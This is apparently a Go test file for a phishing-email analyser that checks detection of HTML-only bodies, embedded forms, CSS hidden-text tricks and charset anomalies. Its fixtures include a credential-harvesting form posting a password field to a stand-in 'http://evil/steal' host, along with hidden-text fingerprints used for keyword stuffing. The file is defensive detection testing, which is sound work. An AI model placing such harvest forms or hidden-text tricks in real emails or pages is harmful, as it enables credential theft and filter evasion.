package header

import (
	"strings"
	"testing"

	contractsk "github.com/saif/cybersiren/shared/contracts/kafka"
)

func TestExtractBodyStructural_HTMLOnly(t *testing.T) {
	t.Parallel()

	// HTML part whose plain body SVC-02 synthesised (PlainSynthesised=true) =>
	// html_only: there was no genuine text/plain alternative.
	got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyHTML:         `<html><body><p>Click <a href="http://x">here</a></p></body></html>`,
		BodyPlain:        "Click here",
		PlainSynthesised: true,
	}, "")
	if !got.HTMLOnly {
		t.Errorf("expected HTMLOnly=true when the plain part was synthesised from HTML")
	}

	// Same HTML but with a genuine plain part (PlainSynthesised=false) => NOT html_only.
	got = extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyHTML:  `<html><body><p>Click <a href="http://x">here</a></p></body></html>`,
		BodyPlain: "Hello, please review the attached invoice and reply by Friday.",
	}, "")
	if got.HTMLOnly {
		t.Errorf("expected HTMLOnly=false when a genuine (non-synthesised) plain part exists")
	}
}

func TestExtractBodyStructural_HTMLOnlyFalseWhenNoHTML(t *testing.T) {
	t.Parallel()
	// A plain-text-only message is not "HTML-only".
	got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyPlain: "just text, nothing fancy",
	}, "")
	if got.HTMLOnly {
		t.Errorf("plain-only message must not be flagged HTMLOnly")
	}
}

func TestExtractBodyStructural_HasForm(t *testing.T) {
	t.Parallel()
	got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyHTML: `<html><body><form action="http://evil/steal" method="post"><input name="pw"></form></body></html>`,
	}, "")
	if !got.HasForm {
		t.Errorf("expected HasForm=true for embedded <form>")
	}
}

func TestExtractBodyStructural_HasFormFromPlainFallback(t *testing.T) {
	t.Parallel()
	// No HTML part: fall back to the plain body for markup detection.
	got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyPlain: `<FORM action=login>`,
	}, "")
	if !got.HasForm {
		t.Errorf("expected HasForm=true when form markup is in the plain fallback")
	}
}

func TestExtractBodyStructural_HiddenText(t *testing.T) {
	t.Parallel()

	cases := map[string]string{
		"display none": `<div style="display:none">spammy keywords</div>`,
		"font size 0":  `<span style="font-size:0px">hidden</span>`,
		"visibility":   `<p style="visibility:hidden">x</p>`,
		"off screen":   `<div style="text-indent:-9999px">x</div>`,
		"opacity zero": `<span style="opacity:0">x</span>`,
		"hidden attr":  `<div hidden>x</div>`,
	}
	for name, html := range cases {
		html := html
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{BodyHTML: "<html>" + html + "</html>"}, "")
			if !got.HasHiddenText {
				t.Errorf("expected HasHiddenText=true for %q", html)
			}
		})
	}
}

func TestExtractBodyStructural_HiddenTextFalsePositives(t *testing.T) {
	t.Parallel()
	// Benign CSS that must NOT be mistaken for hidden-text fingerprints (F4/F5/F8).
	notHidden := map[string]string{
		// F4: substrings of standalone zero-box properties.
		"line-height zero":         `<p style="line-height:0">visible copy</p>`,
		"border-width zero":        `<p style="border-width:0">visible copy</p>`,
		"border-bottom-width zero": `<p style="border-bottom-width:0">visible copy</p>`,
		// F5: a partially-transparent (still visible) element.
		"opacity half": `<p style="opacity:0.5">visible copy</p>`,
		"opacity 0.9":  `<p style="opacity:0.9">visible copy</p>`,
		// F8 (zero-box): non-zero fractional values must not match on the leading "0".
		"width fractional em":   `<p style="width:0.5em">visible copy</p>`,
		"height fractional em":  `<p style="height:0.4em">visible copy</p>`,
		"max-height fractional": `<p style="max-height:0.5em">visible copy</p>`,
	}
	for name, html := range notHidden {
		html := html
		t.Run("not_hidden/"+name, func(t *testing.T) {
			t.Parallel()
			got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{BodyHTML: "<html>" + html + "</html>"}, "")
			if got.HasHiddenText {
				t.Errorf("expected HasHiddenText=false for benign %q", html)
			}
		})
	}

	// Genuinely-hidden cases that must STILL be flagged after the boundary fixes.
	hidden := map[string]string{
		"width zero":      `<div style="width:0">x</div>`,
		"height zero px":  `<div style="height:0px">x</div>`,
		"opacity zero":    `<span style="opacity:0">x</span>`,
		"opacity 0.0":     `<span style="opacity:0.0">x</span>`,
		"font-size 0rem":  `<span style="font-size:0rem">x</span>`,
		"font-size 0vh":   `<span style="font-size:0vh">x</span>`,
		"font-size 0vw":   `<span style="font-size:0vw">x</span>`,
		"font-size plain": `<span style="font-size:0">x</span>`,
		"font-size 0px":   `<span style="font-size:0px">x</span>`,
	}
	for name, html := range hidden {
		html := html
		t.Run("hidden/"+name, func(t *testing.T) {
			t.Parallel()
			got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{BodyHTML: "<html>" + html + "</html>"}, "")
			if !got.HasHiddenText {
				t.Errorf("expected HasHiddenText=true for %q", html)
			}
		})
	}

	// A normal email carrying none of these fingerprints must not be flagged.
	t.Run("normal_email", func(t *testing.T) {
		t.Parallel()
		got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
			BodyHTML:  `<html><body><p style="font-size:14px;line-height:1.4;color:#222">Hi, your statement is ready. Sign in to review it.</p></body></html>`,
			BodyPlain: "Hi, your statement is ready. Sign in to review it.",
		}, "")
		if got.HasHiddenText {
			t.Errorf("a normal email must not be flagged HasHiddenText")
		}
	})
}

func TestExtractBodyStructural_HTMLOnlyDrivenByPlainSynthesised(t *testing.T) {
	t.Parallel()

	html := `<html><body><p>Your invoice is ready, please sign in.</p></body></html>`

	// PlainSynthesised=true + an HTML part => html_only. SVC-04 trusts the parser's
	// flag (A1) instead of re-deriving the synthesis by re-stripping the HTML —
	// which diverged on <style>/<script>/entities and silently dropped the signal.
	// The content of BodyPlain is irrelevant under the new logic.
	got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyHTML:         html,
		BodyPlain:        "Your invoice is ready, please sign in.",
		PlainSynthesised: true,
	}, "")
	if !got.HTMLOnly {
		t.Errorf("PlainSynthesised + HTML must be flagged HTMLOnly")
	}

	// PlainSynthesised=false (a genuine plain part) => NOT html_only.
	got = extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyHTML:  html,
		BodyPlain: "Your invoice is ready, please sign in.",
	}, "")
	if got.HTMLOnly {
		t.Errorf("a genuine plain part (PlainSynthesised=false) must not be HTMLOnly")
	}

	// PlainSynthesised=true but NO recognisable HTML document => not html_only
	// (hasHTML is false), so the flag alone cannot trip it.
	got = extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyPlain:        "plain only",
		PlainSynthesised: true,
	}, "")
	if got.HTMLOnly {
		t.Errorf("PlainSynthesised without an HTML part must not be HTMLOnly")
	}
}

func TestExtractBodyStructural_FormInNonAllowlistedHTML(t *testing.T) {
	t.Parallel()
	// S7: a credential-harvest <form> (and a hidden <font> block) built only from
	// tags OUTSIDE reHTMLTag's structural allowlist must STILL be detected — the
	// old code gated form/hidden-text detection on reHTMLTag and silently produced
	// all-false body signals for such payloads.
	got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyHTML: `<form action="http://evil/steal"><input name="pw"></form>`,
	}, "")
	if !got.HasForm {
		t.Errorf("a <form>-only HTML body (no allowlisted tag) must be flagged HasForm")
	}

	got = extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyHTML: `<font style="color:#ffffff;background:#ffffff">stuffed keywords</font>`,
	}, "")
	if !got.HasHiddenText {
		t.Errorf("a white-on-white <font>-only body must be flagged HasHiddenText")
	}
}

func TestExtractBodyStructural_WhiteOnWhiteHiddenText(t *testing.T) {
	t.Parallel()
	// White text AND white background together => hidden.
	got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyHTML: `<html><body style="background-color:#ffffff"><span style="color:#ffffff">hidden</span></body></html>`,
	}, "")
	if !got.HasHiddenText {
		t.Errorf("expected white-on-white to be flagged hidden")
	}

	// White text alone (default background) must NOT trip the flag.
	got = extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyHTML: `<html><body><span style="color:#ffffff">x</span></body></html>`,
	}, "")
	if got.HasHiddenText {
		t.Errorf("white text alone must not be flagged hidden")
	}
}

func TestExtractBodyStructural_NoHiddenTextOnCleanHTML(t *testing.T) {
	t.Parallel()
	got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyHTML:  `<html><body><p style="color:#222222">Normal newsletter content.</p></body></html>`,
		BodyPlain: "Normal newsletter content.",
	}, "")
	if got.HasHiddenText {
		t.Errorf("clean HTML must not be flagged hidden")
	}
}

func TestExtractBodyStructural_EncodingAnomalyCharsetMismatch(t *testing.T) {
	t.Parallel()
	// Declares us-ascii but the body carries multibyte UTF-8.
	got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyPlain: "Pay now: пароль 支付",
	}, "us-ascii")
	if !got.EncodingAnomaly {
		t.Errorf("expected EncodingAnomaly for ascii claim with non-ascii body")
	}

	// utf-8 declared body with the same content is fine.
	got = extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyPlain: "Pay now: пароль 支付",
	}, "utf-8")
	if got.EncodingAnomaly {
		t.Errorf("utf-8 declared multibyte body must not be an anomaly")
	}
}

func TestExtractBodyStructural_EncodingAnomalyControlChars(t *testing.T) {
	t.Parallel()
	// A burst of NUL/control bytes across a long-enough body is anomalous.
	body := strings.Repeat("normal readable copy ", 12) + strings.Repeat("\x00\x01\x02", 40)
	got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{BodyPlain: body}, "utf-8")
	if !got.EncodingAnomaly {
		t.Errorf("expected EncodingAnomaly for high control-char density over a long body")
	}

	// S6: a short body with one stray control byte must NOT trip the ratio (1/31 =
	// 3.2% > 2% but below the length floor) — that was a false positive on benign
	// short messages.
	got = extractBodyStructural(&contractsk.AnalysisHeadersMessage{
		BodyPlain: "hello team, see attached\x0cthanks",
	}, "utf-8")
	if got.EncodingAnomaly {
		t.Errorf("a single control byte in a short body must not trip EncodingAnomaly")
	}
}

func TestExtractBodyStructural_EncodingAnomalyLatin1NotFlagged(t *testing.T) {
	t.Parallel()
	// S4: iso-8859-1 / latin-1 legitimately carry printable 0x80-0xFF bytes
	// (accented Western-European copy) — NOT an anomaly, unlike a true 7-bit
	// us-ascii claim.
	for _, cs := range []string{"iso-8859-1", "latin-1", "ISO-8859-1"} {
		got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
			BodyPlain: "Gruesse und vielen Dank fuer die Zahlung — pagué la facturación",
		}, cs)
		if got.EncodingAnomaly {
			t.Errorf("charset %q with accented body must not be an EncodingAnomaly", cs)
		}
	}
}

func TestBodyCharsetOf(t *testing.T) {
	t.Parallel()
	// S5: the body-part charset (BodyCharset) is preferred; ContentCharset (the
	// top-level Content-Type, empty for multipart mail) is only the fallback.
	if got := bodyCharsetOf(&contractsk.AnalysisHeadersMessage{BodyCharset: "us-ascii", ContentCharset: "utf-8"}); got != "us-ascii" {
		t.Errorf("BodyCharset must win, got %q", got)
	}
	if got := bodyCharsetOf(&contractsk.AnalysisHeadersMessage{ContentCharset: "utf-8"}); got != "utf-8" {
		t.Errorf("ContentCharset fallback expected, got %q", got)
	}
	if got := bodyCharsetOf(nil); got != "" {
		t.Errorf("nil msg must yield empty charset, got %q", got)
	}
}

func TestExtractBodyStructural_NilAndEmpty(t *testing.T) {
	t.Parallel()
	if got := extractBodyStructural(nil, ""); got != (bodyStructuralSignals{}) {
		t.Errorf("nil message must yield zero signals, got %+v", got)
	}
	if got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{}, ""); got != (bodyStructuralSignals{}) {
		t.Errorf("empty body must yield zero signals, got %+v", got)
	}
}
